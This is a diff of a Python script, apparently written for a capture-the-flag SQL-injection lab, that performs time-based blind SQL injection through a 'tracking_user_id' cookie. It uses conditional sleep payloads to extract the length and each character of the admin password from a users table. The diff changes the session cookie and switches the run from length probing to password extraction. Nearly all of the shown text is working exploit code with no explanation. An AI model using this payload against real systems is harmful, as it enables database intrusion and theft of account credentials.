@@ -15,7 +15,7 @@ TIME_DELAY = 1
 def get_length_password_status(length):
     url = 'https://labs.matesctf.org/lab/sqli/2/index.php?page=shop'
     cookies = {
-        'PHPSESSID': '4df18412f4acb008524954c96f93bbf6',
+        'PHPSESSID': '1fab0263dad51e2fecc69742d76afc15',
         'tracking_user_id': "1-if((select length(password) from users where role = 'admin' limit 1) = {length}, sleep({time_delay}), 'a')".format(length=length, time_delay=TIME_DELAY)
     }
     response = requests.get(url=url, cookies=cookies)
@@ -28,7 +28,7 @@ def get_char_password(position):
 
     for char in list_char:
         cookies = {
-            'PHPSESSID': '4df18412f4acb008524954c96f93bbf6',
+            'PHPSESSID': '1fab0263dad51e2fecc69742d76afc15',
             'tracking_user_id': "1-if((select substr(password, {position}, 1) from users where role = 'admin' limit 1) = '{char}', sleep({time_delay}), 'a')"
                 .format(position=position, char=char, time_delay=TIME_DELAY)
         }
@@ -57,6 +57,6 @@ def brute_force_password():
 
 
 if __name__ == '__main__':
-    brute_force_length()
-    # brute_force_password()
+    # brute_force_length()
+    brute_force_password()
 
